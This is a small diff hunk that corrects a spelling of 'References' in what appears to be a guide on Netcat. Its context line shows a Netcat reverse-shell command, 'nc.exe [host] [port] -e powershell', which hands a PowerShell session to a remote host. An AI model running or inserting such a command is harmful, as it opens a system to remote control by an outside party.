@@ -73,6 +73,6 @@ PS C:\Users\Administrator> C:\path\nc.exe [host] [port] -e powershell
 
 ---
 
-Refrences
+References
 
 - [Netcat](https://nc110.sourceforge.io/)
